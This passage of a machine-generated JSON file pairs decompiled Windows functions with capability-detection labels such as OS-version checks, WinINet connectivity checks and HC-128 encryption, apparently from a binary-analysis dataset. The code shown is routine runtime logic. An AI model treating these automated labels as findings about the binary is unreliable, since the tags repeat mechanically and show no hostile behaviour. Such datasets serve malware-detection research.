        "decompiled_code": "\nuint32_t __fastcall fcn.00409864(uint param_1, uint8_t *param_2)\n\n{\n    uint32_t uVar1;\n    uint8_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    \n    if (in_EAX == param_2) {\n        return 0;\n    }\n    if ((in_EAX & param_2) == 0) {\n        if (in_EAX == NULL) {\n            return -*(param_2 + -4);\n        }\n        if (param_2 == NULL) {\n            return *(in_EAX + -4);\n        }\n    }\n    if (*param_2 != *in_EAX) {\n        return *in_EAX - *param_2;\n    }\n    uVar4 = *(in_EAX + -4) - *(param_2 + -4);\n    iVar2 = ((*(in_EAX + -4) < *(param_2 + -4)) - 1 & uVar4) - *(in_EAX + -4);\n    iVar3 = iVar2;\n    while (uVar5 = *(in_EAX + (iVar3 - iVar2)) ^ *(param_2 + (iVar3 - iVar2)),  uVar5 == 0) {\n        iVar3 = iVar3 + 4;\n        if (-1 < iVar3) {\n            return uVar4;\n        }\n    }\n    uVar1 = 0;\n    if (uVar5 != 0) {\n        for (; (uVar5 >> uVar1 & 1) == 0; uVar1 = uVar1 + 1) {\n        }\n    }\n    iVar3 = iVar3 + (uVar1 >> 3);\n    if (-1 < iVar3) {\n        return uVar4;\n    }\n    return in_EAX[iVar3 - iVar2] - param_2[iVar3 - iVar2];\n}\n",
        "token_count": 429
    },
    "0046cd48": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046cd48(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint32_t uVar3;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    if (in_EAX[0x20] < 1) {\n        uVar2 = in_ECX + 5;\n        uVar3 = uVar2;\n    }\n    else {\n        if ((in_ECX != 0) && (*(*in_EAX + 0x2c) == 2)) {\n            fcn.0046d4e0();\n        }\n        fcn.0046bcc0();\n        fcn.0046bcc0();\n        var_8h = fcn.0046c664();\n        uVar2 = in_EAX[0x5a9] + 10U >> 3;\n        uVar3 = in_EAX[0x5aa] + 10U >> 3;\n        if (uVar3 <= uVar2) {\n            uVar2 = uVar3;\n        }\n    }\n    if ((uVar2 < in_ECX + 4U) || (in_EDX == 0)) {\n        if ((in_EAX[0x21] == 4) || (uVar2 == uVar3)) {\n            if (in_EAX[0x5ae] < 0xe) {\n                *(in_EAX + 0x5ad) = *(in_EAX + 0x5ad) | arg_8h + 2 << (in_EAX[0x5ae] & 0x1f);\n                in_EAX[0x5ae] = in_EAX[0x5ae] + 3;\n            }\n            else {\n                *(in_EAX + 0x5ad) = *(in_EAX + 0x5ad) | arg_8h + 2U << (in_EAX[0x5ae] & 0x1f);\n                iVar1 = in_EAX[5];\n                in_EAX[5] = in_EAX[5] + 1;\n                *(in_EAX[2] + iVar1) = *(in_EAX + 0x5ad);\n                iVar1 = in_EAX[5];\n                in_EAX[5] = in_EAX[5] + 1;\n                *(in_EAX[2] + iVar1) = *(in_EAX + 0x5ad) >> 8;\n                *(in_EAX + 0x5ad) = (arg_8h + 2U & 0xffff) >> (0x10U - in_EAX[0x5ae] & 0x1f);\n                in_EAX[0x5ae] = in_EAX[0x5ae] + -0xd;\n            }\n            fcn.0046d020();\n        }\n        else {\n            if (in_EAX[0x5ae] < 0xe) {\n                *(in_EAX + 0x5ad) = *(in_EAX + 0x5ad) | arg_8h + 4 << (in_EAX[0x5ae] & 0x1f);\n                in_EAX[0x5ae] = in_EAX[0x5ae] + 3;\n            }\n            else {\n                *(in_EAX + 0x5ad) = *(in_EAX + 0x5ad) | arg_8h + 4U << (in_EAX[0x5ae] & 0x1f);\n                iVar1 = in_EAX[5];\n                in_EAX[5] = in_EAX[5] + 1;\n                *(in_EAX[2] + iVar1) = *(in_EAX + 0x5ad);\n                iVar1 = in_EAX[5];\n                in_EAX[5] = in_EAX[5] + 1;\n                *(in_EAX[2] + iVar1) = *(in_EAX + 0x5ad) >> 8;\n                *(in_EAX + 0x5ad) = (arg_8h + 4U & 0xffff) >> (0x10U - in_EAX[0x5ae] & 0x1f);\n                in_EAX[0x5ae] = in_EAX[0x5ae] + -0xd;\n            }\n            fcn.0046c6c8(var_8h + 1);\n            fcn.0046d020();\n        }\n    }\n    else {\n        fcn.0046c9c0(arg_8h);\n    }\n    fcn.0046b8f0();\n    if (arg_8h != 0) {\n        fcn.0046d5bc();\n    }\n    return;\n}\n",
        "token_count": 1100
    },
    "00401760": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00401760(void)\n\n{\n    char cVar1;\n    \n    if (*0x49304d != '\\0') {\n        while (cVar1 = fcn.00401450(),  cVar1 != '\\0') {\n            if (*0x4935b5 == '\\0') {\n                sub.kernel32.dll_Sleep(0);\n                cVar1 = fcn.00401450();\n                if (cVar1 == '\\0') {\n                    return;\n                }\n                sub.kernel32.dll_Sleep();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "004022e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004022e4(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    \n    if (((*0x493720 != 0) && (in_EAX <= *0x49371c)) && (*0x49371c <= in_EAX + 0x13fff0)) {\n        uVar1 = *0x49371c;\n        if (*0x493720 == 0x13ffe0) {\n            uVar1 = 0;\n        }\n        return uVar1;\n    }\n    return in_EAX + 0x10;\n}\n",
        "token_count": 134
    },
    "004025b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.004025b8(void)\n\n{\n    uint32_t in_EAX;\n    \n    if (*0x49304d != '\\0') {\n        while (in_EAX = fcn.00401450(),  in_EAX != '\\0') {\n            if (*0x4935b5 == '\\0') {\n                sub.kernel32.dll_Sleep();\n                in_EAX = fcn.00401450();\n                if (in_EAX == '\\0') break;\n                sub.kernel32.dll_Sleep();\n            }\n        }\n    }\n    if (*0x4957bc == 0) {\n        in_EAX = sub.kernel32.dll_VirtualAlloc(0, 0x10000, 0x1000, 4);\n        *0x4957bc = in_EAX;\n    }\n    return in_EAX & 0xffffff00 | *0x4957bc != 0;\n}\n",
        "token_count": 198
    },
    "0040266c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0040266c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    uVar4 = 0;\n    if (*0x4957bc != NULL) {\n        cVar1 = fcn.004025b8();\n        if (cVar1 != '\\0') {\n            iVar3 = **0x4957bc;\n            if (-1 < iVar3 + -1) {\n                iVar2 = 0;\n                do {\n                    if (in_EAX == (*0x4957bc)[iVar2 + 1]) {\n                        (*0x4957bc)[iVar2 + 1] = (*0x4957bc)[**0x4957bc];\n                        **0x4957bc = **0x4957bc + -1;\n                        uVar4 = 1;\n                        break;\n                    }\n                    iVar2 = iVar2 + 1;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n            *0x4957c0 = 0;\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 260
    },
    "00402ccc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00402ccc(void)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    code **ppcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    iVar4 = 0x37;\n    ppcVar3 = 0x490060;\n    do {\n        if (*ppcVar3 == NULL) {\n            *ppcVar3 = fcn.00401590;\n        }\n        ppcVar3[-2] = ppcVar3 + -7;\n        ppcVar3[-6] = ppcVar3 + -7;\n        ppcVar3[-4] = NULL;\n        ppcVar3[-5] = 0x1;\n        uVar2 = (*(ppcVar3 + -0x1a) * 0xc + 0xef & 0xffffff00) + 0x30;\n        if (uVar2 < 0xb30) {\n            uVar2 = 0xb30;\n        }\n        uVar2 = uVar2 + 0x4d0 >> 0xd;\n        if (7 < uVar2) {\n            uVar2 = 7;\n        }\n        *(ppcVar3 + -0x1b) = -1 << (uVar2 & 0x1f);\n        *(ppcVar3 + -1) = (uVar2 << 0xd) + 0xb30;\n        uVar1 = *(ppcVar3 + -0x1a);\n        uVar2 = (uVar1 * 0x30 + 0xef & 0xffffff00) + 0x30;\n        if (uVar2 < 0x7330) {\n            uVar2 = 0x7330;\n        }\n        if (0xff30 < uVar2) {\n            uVar2 = 0xff30;\n        }\n        *(ppcVar3 + -2) = (((uVar2 - 0x20) / uVar1) * uVar1 + 0xef & 0xff00) + 0x30;\n        ppcVar3 = ppcVar3 + 8;\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    fcn.00402c88();\n    *0x493708 = 0x493708;\n    *0x49370c = 0x493708;\n    iVar5 = 0x400;\n    iVar4 = 0x4937a8;\n    do {\n        *iVar4 = iVar4;\n        *(iVar4 + 4) = iVar4;\n        iVar4 = iVar4 + 8;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    *0x4957ac = 0x4957ac;\n    *0x4957b0 = 0x4957ac;\n    return;\n}\n",
        "token_count": 639
    },
    "00402e84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00402e84(void)\n\n{\n    if (*0x4957c4 != 0) {\n        sub.user32.dll_DestroyWindow(*0x4957c4);\n        *0x4957c4 = 0;\n    }\n    if (*0x4935b4 != '\\0') {\n        fcn.00402810();\n    }\n    if (*0x4957bc != 0) {\n        sub.kernel32.dll_VirtualFree(*0x4957bc, 0, 0x8000);\n        *0x4957bc = 0;\n    }\n    fcn.00402df4();\n    return;\n}\n",
        "token_count": 142
    },
    "00403040": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00403040(void)\n\n{\n    uint8_t in_AL;\n    \n    if (*0x493008 != NULL) {\n        (**0x493008)();\n    }\n    if ((in_AL & 0x7f) == 0) {\n        fcn.0040772c();\n    }\n    fcn.00402fe8();\n    return;\n}\n",
        "token_count": 80
    },
    "00402f74": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00402f74(void)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = fcn.0040772c();\n    if (*piVar1 != 0) {\n        piVar1 = fcn.0040772c();\n        return *(*piVar1 + 8);\n    }\n    return 0;\n}\n",
        "token_count": 77
    },
    "00402f94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00402f94(void)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = fcn.0040772c();\n    if (*piVar1 != 0) {\n        piVar1 = fcn.0040772c();\n        return *(*piVar1 + 4);\n    }\n    return 0;\n}\n",
        "token_count": 77
    },
    "0040304c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403021)\n// WARNING: Removing unreachable block (ram,0x00403026)\n\nvoid __fastcall fcn.0040304c(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040772c(param_1, param_2);\n    if (*(iVar1 + 4) != 0) {\n        if (*0x493008 != NULL) {\n            (**0x493008)();\n        }\n        fcn.0040772c();\n        fcn.00402fe8();\n        return;\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "004031ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004031ec(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint8_t *in_EAX;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    int32_t iVar6;\n    uint8_t *puStack20;\n    \n    while( true ) {\n        while ((*in_EAX != 0 && (*in_EAX < 0x21))) {\n            in_EAX = sub.user32.dll_CharNextA();\n        }\n        puStack20 = in_EAX;\n        if ((*in_EAX != 0x22) || (in_EAX[1] != 0x22)) break;\n        in_EAX = in_EAX + 2;\n    }\n    while (puVar3 = in_EAX,  0x20 < *puVar3) {\n        if (*puVar3 == 0x22) {\n            puVar2 = sub.user32.dll_CharNextA(puVar3);\n            while ((puVar5 = puVar2,  *puVar5 != 0 && (*puVar5 != 0x22))) {\n                puVar2 = sub.user32.dll_CharNextA(puVar3);\n                puStack20 = puVar5;\n            }\n            in_EAX = puVar5;\n            if (*puVar5 != 0) {\n                in_EAX = sub.user32.dll_CharNextA(puVar3);\n                puStack20 = puVar5;\n            }\n        }\n        else {\n            in_EAX = sub.user32.dll_CharNextA();\n            puStack20 = puVar3;\n        }\n    }\n    fcn.00405b8c();\n    iVar1 = *param_2;\n    iVar6 = 0;\n    puVar3 = puStack20;\n    while (puVar2 = puVar3,  0x20 < *puVar2) {\n        if (*puVar2 == 0x22) {\n            puVar3 = sub.user32.dll_CharNextA(puVar2);\n            while ((puVar5 = puVar3,  *puVar5 != 0 && (*puVar5 != 0x22))) {\n                puVar4 = sub.user32.dll_CharNextA(puVar2);\n                for (puVar3 = puVar5; puStack20 = puVar5,  puVar3 < puVar4; puVar3 = puVar3 + 1) {\n                    *(iVar1 + iVar6) = *puVar3;\n                    iVar6 = iVar6 + 1;\n                }\n            }\n            puVar3 = puVar5;\n            if (*puVar5 != 0) {\n                puVar3 = sub.user32.dll_CharNextA(puVar2);\n                puStack20 = puVar5;\n            }\n        }\n        else {\n            puVar5 = sub.user32.dll_CharNextA();\n            for (puVar3 = puVar2; puStack20 = puVar2,  puVar3 < puVar5; puVar3 = puVar3 + 1) {\n                *(iVar1 + iVar6) = *puVar3;\n                iVar6 = iVar6 + 1;\n            }\n        }\n    }\n    return CONCAT44(puStack20, puVar2);\n}\n",
        "token_count": 731
    },
    "004032e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403320)\n\nvoid fcn.004032e8(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x403339;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    sub.kernel32.dll_GetCommandLineA();\n    fcn.004031ec();\n    fcn.004031ec();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x403340;\n    uStack24 = 0x403338;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 176
    },
    "00403348": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403348(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uchar auStack276 [264];\n    \n    fcn.0040546c();\n    if (in_EAX == 0) {\n        sub.kernel32.dll_GetModuleFileNameA(0, auStack276, 0x105);\n        fcn.0040555c();\n    }\n    else {\n        sub.kernel32.dll_GetCommandLineA();\n        while( true ) {\n            fcn.004031ec();\n            if ((in_EAX == 0) || (*param_2 == 0)) break;\n            in_EAX = in_EAX + -1;\n        }\n    }\n    return;\n}\n",
        "token_count": 160
    },
    "00403490": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403490(uint param_1, ushort param_2)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    uVar1 = *(in_EAX + 4);\n    if ((uVar1 < 0xd7b0) || (0xd7b3 < uVar1)) {\n        iVar2 = 0x66;\n    }\n    else {\n        if (uVar1 != 0xd7b0) {\n            fcn.0040390c();\n        }\n        *(in_EAX + 4) = param_2;\n        if ((*(in_EAX + 0x48) == '\\0') && (*(in_EAX + 0x18) == 0)) {\n            *(in_EAX + 0x18) = 0x4035b8;\n        }\n        iVar2 = (**(in_EAX + 0x18))();\n    }\n    if (iVar2 != 0) {\n        fcn.0040306c();\n    }\n    return iVar2;\n}\n",
        "token_count": 241
    },
    "00403d40": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403d40(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(in_EAX + 1) != 0xd7b0) {\n        if (3 < *(in_EAX + 1) - 0xd7b0) goto code_r0x00403e14;\n        iVar1 = (*in_EAX[9])();\n        if (iVar1 != 0) {\n            fcn.0040306c();\n        }\n    }\n    *(in_EAX + 1) = 0xd7b3;\n    in_EAX[2] = param_2;\n    in_EAX[9] = 0x403d18;\n    in_EAX[7] = 0x403548;\n    if (*(in_EAX + 0x12) == '\\0') {\n        in_EAX[9] = 0x403548;\n        if (param_1 == 3) {\n            uVar2 = 0xfffffff5;\n        }\n        else {\n            uVar2 = 0xfffffff6;\n        }\n        iVar1 = sub.kernel32.dll_GetStdHandle(uVar2);\n    }\n    else {\n        if (((param_1 != 3) && (param_1 != 2)) && (*(in_EAX + 1) = 0xd7b2,  param_1 != 1)) {\n            *(in_EAX + 1) = 0xd7b1;\n        }\n        iVar1 = sub.kernel32.dll_CreateFileA();\n    }\n    if (iVar1 != -1) {\n        *in_EAX = iVar1;\n        return;\n    }\n    *(in_EAX + 1) = 0xd7b0;\n    sub.kernel32.dll_GetLastError();\ncode_r0x00403e14:\n    fcn.0040306c();\n    return;\n}\n",
        "token_count": 432
    },
    "00404020": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00404020(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    \n    while (0x40 < param_2) {\n        param_2 = param_2 + -0x40;\n        fcn.00403fcc();\n        iVar2 = fcn.0040772c();\n        if (*(iVar2 + 4) != 0) {\n            return in_EAX;\n        }\n    }\n    if (0 < param_2) {\n        puVar3 = 0x404050;\n        if ((*(in_EAX + 4) == -0x284e) || (cVar1 = fcn.00403f88(param_2, 0x404050),  cVar1 != '\\0')) {\n            while( true ) {\n                puVar4 = *(in_EAX + 0x14) + *(in_EAX + 0xc);\n                iVar2 = *(in_EAX + 8) - *(in_EAX + 0xc);\n                if (param_2 < iVar2) break;\n                *(in_EAX + 0xc) = *(in_EAX + 0xc) + iVar2;\n                param_2 = param_2 - iVar2;\n                for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *puVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar4 = puVar4 + 1;\n                }\n                iVar2 = (**(in_EAX + 0x1c))();\n                if (iVar2 != 0) {\n                    fcn.0040306c();\n                    return in_EAX;\n                }\n            }\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + param_2;\n            for (; param_2 != 0; param_2 = param_2 + -1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n        }\n        return in_EAX;\n    }\n    return in_EAX;\n}\n",
        "token_count": 506
    },
    "004046f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004046f4(int32_t **param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x404778;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *param_1 = NULL;\n    iVar1 = fcn.00404788();\n    if (iVar1 != 0) {\n        if (*(iVar1 + 0x14) == 0) {\n            fcn.004046c4();\n            fcn.00407110();\n        }\n        else {\n            *param_1 = in_EAX + *(iVar1 + 0x14);\n            if (*param_1 != NULL) {\n                (**(**param_1 + 4))(*param_1);\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x40477f;\n    uStack32 = 0x404777;\n    fcn.004070f8();\n    return;\n}\n",
        "token_count": 283
    },
    "0040483c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
